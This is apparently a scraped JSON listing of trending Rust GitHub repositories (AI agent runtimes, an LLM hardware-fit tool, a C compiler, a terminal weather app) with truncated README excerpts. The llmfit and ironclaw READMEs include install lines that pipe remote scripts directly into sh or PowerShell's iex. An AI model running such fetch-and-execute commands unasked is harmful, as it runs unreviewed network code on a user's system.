[
  {
    "basic_info": {
      "name": "zeroclaw",
      "full_name": "zeroclaw-labs/zeroclaw",
      "owner": "zeroclaw-labs",
      "description": "Fast, small, and fully autonomous AI assistant infrastructure ‚Äî deploy anywhere, swap anything ü¶Ä",
      "url": "https://github.com/zeroclaw-labs/zeroclaw",
      "clone_url": "https://github.com/zeroclaw-labs/zeroclaw.git",
      "ssh_url": "git@github.com:zeroclaw-labs/zeroclaw.git",
      "homepage": "https://zeroclawlabs.ai",
      "created_at": "2026-02-13T08:56:04Z",
      "updated_at": "2026-02-27T03:25:40Z",
      "pushed_at": "2026-02-27T03:23:24Z"
    },
    "stats": {
      "stars": 19959,
      "forks": 2467,
      "watchers": 19959,
      "open_issues": 98,
      "size": 15146
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 6823450,
        "Python": 380483,
        "TypeScript": 247388,
        "Shell": 127525,
        "CSS": 27433,
        "JavaScript": 12831,
        "Dockerfile": 7245,
        "C++": 4188,
        "Nix": 3090,
        "Go": 2042,
        "Slint": 1848,
        "HTML": 1113
      },
      "license": "Apache License 2.0",
      "topics": [
        "official",
        "official-website"
      ]
    },
    "content": {
      "readme": "<p align=\"center\">\n  <img src=\"zeroclaw.png\" alt=\"ZeroClaw\" width=\"200\" />\n</p>\n\n<h1 align=\"center\">ZeroClaw ü¶Ä</h1>\n\n<p align=\"center\">\n  <strong>Zero overhead. Zero compromise. 100% Rust. 100% Agnostic.</strong><br>\n  ‚ö°Ô∏è <strong>Runs on $10 hardware with <5MB RAM: That's 99% less memory than OpenClaw and 98% cheaper than a Mac mini!</strong>\n</p>\n\n<p align=\"center\">\n  <a href=\"LICENSE-APACHE\"><img src=\"https://img.shields.io/badge/license-MIT%20OR%20Apache%202.0-blue.svg\" alt=\"License: MIT OR Apache-2.0\" /></a>\n  <a href=\"NOTICE\"><img src=\"https://img.shields.io/github/contributors/zeroclaw-labs/zeroclaw?color=green\" alt=\"Contributors\" /></a>\n  <a href=\"https://buymeacoffee.com/argenistherose\"><img src=\"https://img.shields.io/badge/Buy%20Me%20a%20Coffee-Donate-yellow.svg?style=flat&logo=buy-me-a-coffee\" alt=\"Buy Me a Coffee\" /></a>\n  <a href=\"https://x.com/zeroclawlabs?s=21\"><img src=\"https://img.shields.io/badge/X-%40zeroclawlabs-000000?style=flat&logo=x&logoColor=white\" alt=\"X: @zeroclawlabs\" /></a>\n  <a href=\"https://zeroclawlabs.cn/group.jpg\"><img src=\"https://img.shields.io/badge/WeChat-Group-B7D7A8?logo=wechat&logoColor=white\" alt=\"WeChat Group\" /></a>\n  <a href=\"https://www.xiaohongshu.com/user/profile/67cbfc43000000000d008307?xsec_token=AB73VnYnGNx5y36EtnnZfGmAmS-6Wzv8WMuGpfwfkg6Yc%3D&xsec_source=pc_search\"><img src=\"https://img.shields.io/badge/Xiaohongshu-Official-FF2442?style=flat\" alt=\"Xiaohongshu: Official\" /></a>\n  <a href=\"https://t.me/zeroclawlabs\"><img src=\"https://img.shields.io/badge/Telegram-%40zeroclawlabs-26A5E4?style=flat&logo=telegram&logoColor=white\" alt=\"Telegram: @zeroclawlabs\" /></a>\n  <a href=\"https://www.facebook.com/groups/zeroclaw\"><img src=\"https://img.shields.io/badge/Facebook-Group-1877F2?style=flat&logo=facebook&logoColor=white\" alt=\"Facebook Group\" /></a>\n  <a href=\"https://www.reddit.com/r/zeroclawlabs/\"><img src=\"https://img.shields.io/badge/Reddit-r%2Fzeroclawlabs-FF4500?style=flat&logo=reddit&logoColor=white\" alt=\"Reddit: r/zeroclawlabs\" /></a>\n</p>\n<p align=\"center\">\nBuilt by students and members of the Harvard, MIT, and Sundai.Club communities.\n</p>\n\n<p align=\"center\">\n  üåê <strong>Languages:</strong> <a href=\"README.md\">English</a> ¬∑ <a href=\"docs/i18n/zh-CN/README.md\">ÁÆÄ‰Ωì‰∏≠Êñá</a> ¬∑ <a href=\"docs/i18n/ja/README.md\">Êó•Êú¨Ë™û</a> ¬∑ <a href=\"docs/i18n/ru/README.md\">–†—É—Å—Å–∫–∏–π</a> ¬∑ <a href=\"docs/i18n/fr/README.md\">Fran√ßais</a> ¬∑ <a href=\"docs/i18n/vi/README.md\">Ti·∫øng Vi·ªát</a> ¬∑ <a href=\"docs/i18n/el/README.md\">ŒïŒªŒªŒ∑ŒΩŒπŒ∫Œ¨</a>\n</p>\n\n<p align=\"center\">\n  <a href=\"#quick-start\">Getting Started</a> |\n  <a href=\"bootstrap.sh\">One-Click Setup</a> |\n  <a href=\"docs/README.md\">Docs Hub</a> |\n  <a href=\"docs/SUMMARY.md\">Docs TOC</a>\n</p>\n\n<p align=\"center\">\n  <strong>Quick Routes:</strong>\n  <a href=\"docs/reference/README.md\">Reference</a> ¬∑\n  <a href=\"docs/operations/README.md\">Operations</a> ¬∑\n  <a href=\"docs/troubleshooting.md\">Troubleshoot</a> ¬∑\n  <a href=\"docs/security/README.md\">Security</a> ¬∑\n  <a href=\"docs/hardware/README.md\">Hardware</a> ¬∑\n  <a href=\"docs/contributing/README.md\">Contribute</a>\n</p>\n\n<p align=\"center\">\n  <strong>Fast, small, and fully autonomous AI assistant infrastructure</strong><br />\n  Deploy anywhere. Swap anything.\n</p>\n\n<p align=\"center\">\n  ZeroClaw is the <strong>runtime operating system</strong> for agentic workflows ‚Äî infrastructure that abstracts models, tools, memory, and execution so agents can be built once and run anywhere.\n</p>\n\n<p align=\"center\"><code>Trait-driven architecture ¬∑ secure-by-default runtime ¬∑ provider/channel/tool swappable ¬∑ pluggable everything</code></p>\n\n### üì¢ Announcements\n\nUse this board for important notices (breaking changes, security advisories, maintenance windows, and release blockers).\n\n| Date (UTC) | Level       | Notice                                                                                                                                                                                                                                                                                                                                                 | Action                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |\n| ---------- | ----------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:25:47.314540"
  },
  {
    "basic_info": {
      "name": "llmfit",
      "full_name": "AlexsJones/llmfit",
      "owner": "AlexsJones",
      "description": "497 models. 133 providers. One command to find what runs on your hardware.",
      "url": "https://github.com/AlexsJones/llmfit",
      "clone_url": "https://github.com/AlexsJones/llmfit.git",
      "ssh_url": "git@github.com:AlexsJones/llmfit.git",
      "homepage": "",
      "created_at": "2026-02-15T16:11:31Z",
      "updated_at": "2026-02-27T03:18:27Z",
      "pushed_at": "2026-02-26T18:59:49Z"
    },
    "stats": {
      "stars": 5738,
      "forks": 330,
      "watchers": 5738,
      "open_issues": 23,
      "size": 9988
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 252700,
        "Python": 51517,
        "JavaScript": 9765,
        "Shell": 9547,
        "CSS": 5636,
        "HTML": 2607,
        "Makefile": 1367
      },
      "license": "MIT License",
      "topics": [
        "llm",
        "openclaw",
        "skill"
      ]
    },
    "content": {
      "readme": "# llmfit\n\n<p align=\"center\">\n  <img src=\"assets/icon.svg\" alt=\"llmfit icon\" width=\"128\" height=\"128\">\n</p>\n\n**497 models. 133 providers. One command to find what runs on your hardware.**\n\nA terminal tool that right-sizes LLM models to your system's RAM, CPU, and GPU. Detects your hardware, scores each model across quality, speed, fit, and context dimensions, and tells you which ones will actually run well on your machine.\n\nShips with an interactive TUI (default) and a classic CLI mode. Supports multi-GPU setups, MoE architectures, dynamic quantization selection, and speed estimation.\n\n> **Sister project:** Check out [kubeclaw](https://github.com/AlexsJones/kubeclaw/) for managing agents in Kubernetes.\n\n### Quick install (macOS / Linux)\n\n```sh\ncurl -fsSL https://llmfit.axjns.dev/install.sh | sh\n```\n_Downloads the latest release binary from GitHub and installs it to `/usr/local/bin` (or `~/.local/bin`)_\n\nOr\n```sh\nbrew tap AlexsJones/llmfit\nbrew install llmfit\n```\n\nWindows users: see the **Install** section below.\n\n![demo](demo.gif)\n\nExample of a medium performance home laptop\n\n![home](home_laptop.png)\n\n\nExample of models with Mixture-of-Experts architectures\n\n![moe](moe.png)\n\nDownloading a model via Ollama integration\n\n![download](download.gif)\n---\n\n## Install\n\n### Cargo (Windows / macOS / Linux)\n\n```sh\ncargo install llmfit\n```\n\nIf `cargo` is not installed yet, install Rust via [rustup](https://rustup.rs/).\n\n### macOS / Linux\n\n#### Homebrew\n\n```sh\nbrew tap AlexsJones/llmfit\nbrew install llmfit\n```\n\n#### Quick install\n\n```sh\ncurl -fsSL https://llmfit.axjns.dev/install.sh | sh\n```\n\nDownloads the latest release binary from GitHub and installs it to `/usr/local/bin` (or `~/.local/bin` if no sudo).\n\n**Install to `~/.local/bin` without sudo:**\n\n```sh\ncurl -fsSL https://llmfit.axjns.dev/install.sh | sh -s -- --local\n```\n\n### From source\n\n```sh\ngit clone https://github.com/AlexsJones/llmfit.git\ncd llmfit\ncargo build --release\n# binary is at target/release/llmfit\n```\n\n---\n\n## Usage\n\n### TUI (default)\n\n```sh\nllmfit\n```\n\nLaunches the interactive terminal UI. Your system specs (CPU, RAM, GPU name, VRAM, backend) are shown at the top. Models are listed in a scrollable table sorted by composite score. Each row shows the model's score, estimated tok/s, best quantization for your hardware, run mode, memory usage, and use-case category.\n\n| Key | Action |\n|---|---|\n| `Up` / `Down` or `j` / `k` | Navigate models |\n| `/` | Enter search mode (partial match on name, provider, params, use case) |\n| `Esc` or `Enter` | Exit search mode |\n| `Ctrl-U` | Clear search |\n| `f` | Cycle fit filter: All, Runnable, Perfect, Good, Marginal |\n| `s` | Cycle sort column: Score, Params, Mem%, Ctx, Date, Use Case |\n| `t` | Cycle color theme (saved automatically) |\n| `p` | Open provider filter popup |\n| `i` | Toggle installed-first sorting (Ollama only) |\n| `d` | Pull/download selected model via Ollama |\n| `r` | Refresh installed models from Ollama |\n| `1`-`9` | Toggle provider visibility |\n| `Enter` | Toggle detail view for selected model |\n| `PgUp` / `PgDn` | Scroll by 10 |\n| `g` / `G` | Jump to top / bottom |\n| `q` | Quit |\n\n### Themes\n\nPress `t` to cycle through 6 built-in color themes. Your selection is saved automatically to `~/.config/llmfit/theme` and restored on next launch.\n\n| Theme | Description |\n|---|---|\n| **Default** | Original llmfit colors |\n| **Dracula** | Dark purple background with pastel accents |\n| **Solarized** | Ethan Schoonover's Solarized Dark palette |\n| **Nord** | Arctic, cool blue-gray tones |\n| **Monokai** | Monokai Pro warm syntax colors |\n| **Gruvbox** | Retro groove palette with warm earth tones |\n\n### CLI mode\n\nUse `--cli` or any subcommand to get classic table output:\n\n```sh\n# Table of all models ranked by fit\nllmfit --cli\n\n# Only perfectly fitting models, top 5\nllmfit fit --perfect -n 5\n\n# Show detected system specs\nllmfit system\n\n# List all models in the database\nllmfit list\n\n# Search by name, provider, or size\nllmfit search \"llama 8b\"\n\n# Detailed view of a single model\nllmfit info \"Mistral-7B\"\n\n# Top 5 recommendations (JSON, for agent/script consumption)\nllmfit recommend --json --limit 5\n\n# Recommendations filtered by use case\nllmfit recommend --json --use-case coding --limit 3\n```\n\n### GPU memory override\n\nGPU VRAM autodetection can fail on some systems (e.g. broken `nvidia-smi`, VMs, passthrough setups). Use `--memory` to manually specify your GPU's VRAM:\n\n```sh\n# Override with 32 GB VRAM\nllmfit --memory=32G\n\n# Megabytes also work (32000 MB ‚âà 31.25 GB)\nllmfit --memory=32000M\n\n# Works with all modes: TUI, CLI, and subcommands\nllmfit --memory=24G --cli\nllmfit --memory=24G fit --perfect -n 5\nllmfit --memory=24G system\nllmfit --memory=24G info \"Llama-3.1-70B\"\nllmfit --memory=24G recommend --json\n```\n\nAccepted suffixes: `G`/`GB`/`GiB` (gigabytes), `M`/`MB`/`MiB` (megabytes), `T`/`TB`/`TiB` (terabytes). Case-insensitive. If no GPU was detected, the override creates a synthetic GPU entry so models are scored for GPU i",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:25:48.465872"
  },
  {
    "basic_info": {
      "name": "ironclaw",
      "full_name": "nearai/ironclaw",
      "owner": "nearai",
      "description": "IronClaw is OpenClaw inspired implementation in Rust focused on privacy and security",
      "url": "https://github.com/nearai/ironclaw",
      "clone_url": "https://github.com/nearai/ironclaw.git",
      "ssh_url": "git@github.com:nearai/ironclaw.git",
      "homepage": "https://www.ironclaw.com",
      "created_at": "2026-02-03T06:57:10Z",
      "updated_at": "2026-02-27T03:19:24Z",
      "pushed_at": "2026-02-26T23:23:19Z"
    },
    "stats": {
      "stars": 3635,
      "forks": 391,
      "watchers": 3635,
      "open_issues": 158,
      "size": 4778
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 4580031,
        "Shell": 256608,
        "JavaScript": 120821,
        "CSS": 61433,
        "PLpgSQL": 11902,
        "HTML": 11124,
        "Dockerfile": 1819
      },
      "license": "Apache License 2.0",
      "topics": []
    },
    "content": {
      "readme": "<p align=\"center\">\n  <img src=\"ironclaw.png?v=2\" alt=\"IronClaw\" width=\"200\"/>\n</p>\n\n<h1 align=\"center\">IronClaw</h1>\n\n<p align=\"center\">\n  <strong>Your secure personal AI assistant, always on your side</strong>\n</p>\n\n<p align=\"center\">\n  <a href=\"#license\"><img src=\"https://img.shields.io/badge/license-MIT%20OR%20Apache%202.0-blue.svg\" alt=\"License: MIT OR Apache-2.0\" /></a>\n  <a href=\"https://t.me/ironclawAI\"><img src=\"https://img.shields.io/badge/Telegram-%40ironclawAI-26A5E4?style=flat&logo=telegram&logoColor=white\" alt=\"Telegram: @ironclawAI\" /></a>\n  <a href=\"https://www.reddit.com/r/ironclawAI/\"><img src=\"https://img.shields.io/badge/Reddit-r%2FironclawAI-FF4500?style=flat&logo=reddit&logoColor=white\" alt=\"Reddit: r/ironclawAI\" /></a>\n</p>\n\n<p align=\"center\">\n  <a href=\"#philosophy\">Philosophy</a> ‚Ä¢\n  <a href=\"#features\">Features</a> ‚Ä¢\n  <a href=\"#installation\">Installation</a> ‚Ä¢\n  <a href=\"#configuration\">Configuration</a> ‚Ä¢\n  <a href=\"#security\">Security</a> ‚Ä¢\n  <a href=\"#architecture\">Architecture</a>\n</p>\n\n---\n\n## Philosophy\n\nIronClaw is built on a simple principle: **your AI assistant should work for you, not against you**.\n\nIn a world where AI systems are increasingly opaque about data handling and aligned with corporate interests, IronClaw takes a different approach:\n\n- **Your data stays yours** - All information is stored locally, encrypted, and never leaves your control\n- **Transparency by design** - Open source, auditable, no hidden telemetry or data harvesting\n- **Self-expanding capabilities** - Build new tools on the fly without waiting for vendor updates\n- **Defense in depth** - Multiple security layers protect against prompt injection and data exfiltration\n\nIronClaw is the AI assistant you can actually trust with your personal and professional life.\n\n## Features\n\n### Security First\n\n- **WASM Sandbox** - Untrusted tools run in isolated WebAssembly containers with capability-based permissions\n- **Credential Protection** - Secrets are never exposed to tools; injected at the host boundary with leak detection\n- **Prompt Injection Defense** - Pattern detection, content sanitization, and policy enforcement\n- **Endpoint Allowlisting** - HTTP requests only to explicitly approved hosts and paths\n\n### Always Available\n\n- **Multi-channel** - REPL, HTTP webhooks, WASM channels (Telegram, Slack), and web gateway\n- **Docker Sandbox** - Isolated container execution with per-job tokens and orchestrator/worker pattern\n- **Web Gateway** - Browser UI with real-time SSE/WebSocket streaming\n- **Routines** - Cron schedules, event triggers, webhook handlers for background automation\n- **Heartbeat System** - Proactive background execution for monitoring and maintenance tasks\n- **Parallel Jobs** - Handle multiple requests concurrently with isolated contexts\n- **Self-repair** - Automatic detection and recovery of stuck operations\n\n### Self-Expanding\n\n- **Dynamic Tool Building** - Describe what you need, and IronClaw builds it as a WASM tool\n- **MCP Protocol** - Connect to Model Context Protocol servers for additional capabilities\n- **Plugin Architecture** - Drop in new WASM tools and channels without restarting\n\n### Persistent Memory\n\n- **Hybrid Search** - Full-text + vector search using Reciprocal Rank Fusion\n- **Workspace Filesystem** - Flexible path-based storage for notes, logs, and context\n- **Identity Files** - Maintain consistent personality and preferences across sessions\n\n## Installation\n\n### Prerequisites\n\n- Rust 1.85+\n- PostgreSQL 15+ with [pgvector](https://github.com/pgvector/pgvector) extension\n- NEAR AI account (authentication handled via setup wizard)\n\n## Download or Build\n\nVisit [Releases page](https://github.com/nearai/ironclaw/releases/) to see the latest updates.\n\n<details>\n  <summary>Install via Windows Installer (Windows)</summary>\n\nDownload the [Windows Installer](https://github.com/nearai/ironclaw/releases/latest/download/ironclaw-x86_64-pc-windows-msvc.msi) and run it.\n\n</details>\n\n<details>\n  <summary>Install via powershell script (Windows)</summary>\n\n```sh\nirm https://github.com/nearai/ironclaw/releases/latest/download/ironclaw-installer.ps1 | iex\n```\n\n</details>\n\n<details>\n  <summary>Install via shell script (macOS, Linux, Windows/WSL)</summary>\n\n```sh\ncurl --proto '=https' --tlsv1.2 -LsSf https://github.com/nearai/ironclaw/releases/latest/download/ironclaw-installer.sh | sh\n```\n</details>\n\n<details>\n  <summary>Install via Homebrew (macOS/Linux)</summary>\n\n```sh\nbrew install ironclaw\n```\n\n</details>\n\n<details>\n  <summary>Compile the source code (Cargo on Windows, Linux, macOS)</summary>\n\nInstall it with `cargo`, just make sure you have [Rust](https://rustup.rs) installed on your computer.\n\n```bash\n# Clone the repository\ngit clone https://github.com/nearai/ironclaw.git\ncd ironclaw\n\n# Build\ncargo build --release\n\n# Run tests\ncargo test\n```\n\nFor **full release** (after modifying channel sources), run `./scripts/build-all.sh` to rebuild channels first.\n\n</details>\n\n### Database Setup\n\n```ba",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:25:49.659819"
  },
  {
    "basic_info": {
      "name": "claudes-c-compiler",
      "full_name": "anthropics/claudes-c-compiler",
      "owner": "anthropics",
      "description": "Claude Opus 4.6 wrote a dependency-free C compiler in Rust, with backends targeting x86 (64- and 32-bit), ARM, and RISC-V, capable of compiling a booting Linux kernel.",
      "url": "https://github.com/anthropics/claudes-c-compiler",
      "clone_url": "https://github.com/anthropics/claudes-c-compiler.git",
      "ssh_url": "git@github.com:anthropics/claudes-c-compiler.git",
      "homepage": null,
      "created_at": "2026-02-04T22:42:22Z",
      "updated_at": "2026-02-27T03:03:56Z",
      "pushed_at": "2026-02-05T17:14:51Z"
    },
    "stats": {
      "stars": 2409,
      "forks": 175,
      "watchers": 2409,
      "open_issues": 50,
      "size": 11788
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 8154079,
        "C": 325007,
        "Shell": 1825
      },
      "license": "Creative Commons Zero v1.0 Universal",
      "topics": []
    },
    "content": {
      "readme": "# CCC ‚Äî Claude's C Compiler\n\nA C compiler written entirely from scratch in Rust, targeting x86-64, i686,\nAArch64, and RISC-V 64. Zero compiler-specific dependencies ‚Äî the frontend,\nSSA-based IR, optimizer, code generator, peephole optimizers, assembler,\nlinker, and DWARF debug info generation are all implemented from scratch.\nClaude's C Compiler produces ELF executables without any external toolchain.\n\n> Note: With the exception of this one paragraph that was written by a human, 100% of the code and documentation in this repository was written by Claude Opus 4.6. A human guided some of this process by writing test cases that Claude was told to pass, but never interactively pair-programmed with Claude to debug or to provide feedback on code quality. As a result, I do not recommend you use this code! None of it has been validated for correctness. Claude wrote this exclusively on a Linux host; it probably will not work on MacOS/Windows ‚Äî neither I nor Claude have tried. The docs may be wrong and make claims that are false. See [our blog post](https://anthropic.com/engineering/building-c-compiler) for more detail.\n\n## Prerequisites\n\n- **Rust** (stable, 2021 edition) ‚Äî install via [rustup](https://rustup.rs/)\n- **Linux host** ‚Äî the compiler targets Linux ELF executables and relies on\n  Linux system headers / C runtime libraries (glibc or musl) being installed\n  on the host\n- For cross-compilation targets (ARM, RISC-V, i686), the corresponding\n  cross-compilation sysroots should be installed (e.g.,\n  `aarch64-linux-gnu-gcc`, `riscv64-linux-gnu-gcc`)\n\n## Building\n\n```bash\ncargo build --release\n```\n\nThis produces five binaries in `target/release/`, all compiled from the same\nsource. The target architecture is selected by the binary name at runtime:\n\n| Binary | Target |\n|--------|--------|\n| `ccc` | x86-64 (default) |\n| `ccc-x86` | x86-64 |\n| `ccc-arm` | AArch64 |\n| `ccc-riscv` | RISC-V 64 |\n| `ccc-i686` | i686 (32-bit x86) |\n\n## Quick Start\n\nCompile and run a simple C program:\n\n```bash\n# Write a test program\ncat > hello.c << 'EOF'\n#include <stdio.h>\nint main(void) {\n    printf(\"Hello from CCC!\\n\");\n    return 0;\n}\nEOF\n\n# Compile and run (x86-64)\n./target/release/ccc -o hello hello.c\n./hello\n\n# Cross-compile for AArch64 and run under QEMU\n./target/release/ccc-arm -o hello-arm hello.c\nqemu-aarch64 -L /usr/aarch64-linux-gnu ./hello-arm\n```\n\nCCC works as a drop-in GCC replacement. Point your build system at it:\n\n```bash\n# Build a project with make\nmake CC=/path/to/ccc-x86\n\n# Build a project with CMake\ncmake -DCMAKE_C_COMPILER=/path/to/ccc-x86 ..\n\n# Build a project with configure scripts\n./configure CC=/path/to/ccc-x86\n```\n\n## Usage\n\n```bash\n# Compile and link\nccc -o output input.c                # x86-64\nccc-arm -o output input.c            # AArch64\nccc-riscv -o output input.c          # RISC-V 64\nccc-i686 -o output input.c           # i686\n\n# GCC-compatible flags\nccc -S input.c                       # Emit assembly\nccc -c input.c                       # Compile to object file\nccc -E input.c                       # Preprocess only\nccc -O2 -o output input.c            # Optimize (accepts -O0 through -O3, -Os, -Oz)\nccc -g -o output input.c             # DWARF debug info\nccc -DFOO=1 -Iinclude/ input.c       # Define macros, add include paths\nccc -Werror -Wall input.c            # Warning control\nccc -fPIC -shared -o lib.so lib.c    # Position-independent code\nccc -x c -E -                        # Read from stdin\n\n# Build system integration (reports as GCC 14.2.0 for compatibility)\nccc -dumpmachine     # x86_64-linux-gnu / aarch64-linux-gnu / riscv64-linux-gnu / i686-linux-gnu\nccc -dumpversion     # 14\n```\n\nThe compiler accepts most GCC flags. Unrecognized flags (e.g., architecture-\nspecific `-m` flags, unknown `-f` flags) are silently ignored so `ccc` can\nserve as a drop-in GCC replacement in build systems.\n\n### Assembler and Linker Modes\n\nBy default, the compiler uses its **builtin assembler and linker** for all\nfour architectures. No external toolchain is required. You can verify this\nwith `--version`, which shows `Backend: standalone` when using the builtin\ntools.\n\nTo build with optional GCC fallback support (e.g., for debugging), enable\nCargo features at compile time:\n\n```bash\n# Build with GCC assembler and linker fallback\ncargo build --release --features gcc_assembler,gcc_linker\n\n# Build with GCC fallback for -m16 boot code only\ncargo build --release --features gcc_m16\n```\n\n| Feature | Description |\n|---------|-------------|\n| `gcc_assembler` | Use GCC as the assembler instead of the builtin |\n| `gcc_linker` | Use GCC as the linker instead of the builtin |\n| `gcc_m16` | Use GCC for `-m16` (16-bit real mode boot code) |\n\nWhen compiled with GCC fallback features enabled, `--version` shows which\ncomponents use GCC (e.g., `Backend: gcc_assembler, gcc_linker`).\n\n## Status\n\nThe compiler can build real-world C codebases across all four architectures,\nincluding the Linux kernel. Projects that compile and pass their test su",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:25:50.794277"
  },
  {
    "basic_info": {
      "name": "weathr",
      "full_name": "Veirt/weathr",
      "owner": "Veirt",
      "description": "a terminal weather app with ascii animation",
      "url": "https://github.com/Veirt/weathr",
      "clone_url": "https://github.com/Veirt/weathr.git",
      "ssh_url": "git@github.com:Veirt/weathr.git",
      "homepage": "",
      "created_at": "2026-02-08T17:52:29Z",
      "updated_at": "2026-02-27T03:00:05Z",
      "pushed_at": "2026-02-26T16:50:23Z"
    },
    "stats": {
      "stars": 2214,
      "forks": 75,
      "watchers": 2214,
      "open_issues": 11,
      "size": 6458
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 206307,
        "Nix": 3251
      },
      "license": "GNU General Public License v3.0",
      "topics": [
        "cli",
        "rust-lang",
        "terminal",
        "tui",
        "weather"
      ]
    },
    "content": {
      "readme": "# weathr\n\n[![Crates.io](https://img.shields.io/crates/v/weathr.svg)](https://crates.io/crates/weathr)\n[![Downloads](https://img.shields.io/crates/d/weathr.svg)](https://crates.io/crates/weathr)\n[![License](https://img.shields.io/crates/l/weathr.svg)](https://github.com/veirt/weathr/blob/main/LICENSE)\n\nA terminal weather app with ASCII animations driven by real-time weather data.\n\nFeatures real-time weather from Open-Meteo with animated rain, snow, thunderstorms, flying airplanes, day/night cycles, and auto-location detection.\n\n## Demo\n\n### Thunderstorm Night\n\n![Thunderstorm night demo](docs/thunderstorm-night.gif)\n\n### Snow\n\n![Snow demo](docs/snow.gif)\n\n### Night\n\n![Night demo](docs/night.gif)\n\n## Contents\n\n- [Installation](#installation)\n- [Packaging Status](#packaging-status)\n- [Configuration](#configuration)\n- [Usage](#usage)\n- [Privacy](#privacy)\n- [Roadmap](#roadmap)\n- [License](#license)\n\n## Packaging Status\n\n[![Packaging status](https://repology.org/badge/vertical-allrepos/weathr.svg)](https://repology.org/project/weathr/versions)\n\n## Installation\n\n### Via Cargo\n\n```bash\ncargo install weathr\n```\n\n### Build from Source\n\nYou need Rust installed.\n\n```bash\ngit clone https://github.com/veirt/weathr.git\ncd weathr\ncargo install --path .\n```\n\n### Homebrew (macOS)\n\n```bash\nbrew install Veirt/veirt/weathr\n```\n\n### MacPorts (macOS)\n\n```bash\nsudo port install weathr\n```\n\n### Arch Linux\n\nAvailable in AUR:\n\n```bash\nyay -S weathr\n```\n\nor\n\n```bash\nyay -S weathr-bin\n```\n\n### Nix flake (NixOS)\n\nAvailable as a flake:\n\n```nix\ninputs = {\n    weathr.url = \"github:Veirt/weathr\";\n};\n```\n\nAdd to packages:\n\n```nix\nenvironment.systemPackages = [\n    inputs.weathr.packages.${system}.default\n];\n```\n\nor use home-manager module option:\n\n```nix\nimports = [\n    inputs.weathr.homeModules.weathr\n];\n\nprograms.weathr = {\n    enable = true;\n    settings = {\n        hide_hud = true;\n    };\n};\n```\n\n### Windows\n\nAvailable through Winget:\n\n```\nwinget install -i Veirt.weathr\n```\n\n## Configuration\n\nThe config file location depends on your platform:\n\n- **Linux**: `~/.config/weathr/config.toml` (or `$XDG_CONFIG_HOME/weathr/config.toml`)\n- **macOS**: `~/Library/Application Support/weathr/config.toml`\n- **Windows**: `~/AppData/Roaming/weathr/config.toml`\n\nYou can also place a `config.toml` in the current working directory, which takes priority over the default location.\n\n### Setup\n\n```bash\n# Linux\nmkdir -p ~/.config/weathr\n\n# macOS\nmkdir -p ~/Library/Application\\ Support/weathr\n\n# Windows (PowerShell)\nNew-Item -Path $env:APPDATA/weathr -Type Directory\n\n# Windows (Command Prompt)\nmkdir %APPDATA%/weathr\n```\n\nEdit the config file at the appropriate path for your platform:\n\n```toml\n# Hide the HUD (Heads Up Display) with weather details\nhide_hud = false\n\n# Run silently without startup messages (errors still shown)\nsilent = false\n\n[location]\n# Location coordinates (overridden if auto = true)\nlatitude = 52.5200\nlongitude = 13.4050\n\n# Auto-detect location via IP (defaults to true if config missing)\nauto = false\n\n# Hide the location name in the UI\nhide = false\n\n# How to display the location in the HUD: \"coordinates\" | \"city\" | \"mixed\"\ndisplay = \"mixed\"\n\n# Optional: manually override the city name shown in the HUD.\n# When set, skips reverse geocoding entirely.\n# city = \"Berlin\"\n\n# Language for the resolved city name. \"auto\" uses the locale of the coordinates.\n# Accepts BCP-47 language tags: \"en\", \"de\", \"ru\", \"ja\", etc.\n# city_name_language = \"auto\"\n\n[units]\n# Temperature unit: \"celsius\" or \"fahrenheit\"\ntemperature = \"celsius\"\n\n# Wind speed unit: \"kmh\", \"ms\", \"mph\", or \"kn\"\nwind_speed = \"kmh\"\n\n# Precipitation unit: \"mm\" or \"inch\"\nprecipitation = \"mm\"\n```\n\n### Location Display Modes\n\nThe `display` option controls how the location appears in the HUD. City names are resolved\nvia reverse geocoding (Nominatim/OpenStreetMap). When a city cannot be resolved (e.g. open\nsea or no Nominatim match), all modes fall back to showing coordinates.\n\n| Mode          | City resolved                         | City not resolved            |\n| :------------ | :------------------------------------ | :--------------------------- |\n| `coordinates` | `Location: 52.52¬∞N, 13.41¬∞E`          | `Location: 52.52¬∞N, 13.41¬∞E` |\n| `city`        | `Location: Berlin`                    | `Location: 52.52¬∞N, 13.41¬∞E` |\n| `mixed`       | `Location: Berlin (52.52¬∞N, 13.41¬∞E)` | `Location: 52.52¬∞N, 13.41¬∞E` |\n\n### Example Locations\n\n```toml\n# Tokyo, Japan\nlatitude = 35.6762\nlongitude = 139.6503\n\n# Sydney, Australia\nlatitude = -33.8688\nlongitude = 151.2093\n```\n\n## Usage\n\nRun with real-time weather:\n\n```bash\nweathr\n```\n\n### CLI Options\n\nSimulate weather conditions for testing:\n\n```bash\n# Simulate rain\nweathr --simulate rain\n\n# Simulate snow at night\nweathr --simulate snow --night\n\n# Clear day with falling leaves\nweathr --simulate clear --leaves\n```\n\nAvailable weather conditions:\n\n- Clear Skies: `clear`, `partly-cloudy`, `cloudy`, `overcast`\n- Precipitation: `fog`, `drizzle`, `rain`, `freezing-rain`, ",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:25:51.929457"
  },
  {
    "basic_info": {
      "name": "openfang",
      "full_name": "RightNow-AI/openfang",
      "owner": "RightNow-AI",
      "description": "Open-source Agent Operating System",
      "url": "https://github.com/RightNow-AI/openfang",
      "clone_url": "https://github.com/RightNow-AI/openfang.git",
      "ssh_url": "git@github.com:RightNow-AI/openfang.git",
      "homepage": "https://www.openfang.sh/",
      "created_at": "2026-02-24T23:12:38Z",
      "updated_at": "2026-02-27T03:25:33Z",
      "pushed_at": "2026-02-26T23:10:48Z"
    },
    "stats": {
      "stars": 2154,
      "forks": 216,
      "watchers": 2154,
      "open_issues": 4,
      "size": 5470
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 4985046,
        "HTML": 290605,
        "JavaScript": 262438,
        "CSS": 89300,
        "Python": 27578,
        "PowerShell": 6076,
        "Shell": 4933,
        "Dockerfile": 2526
      },
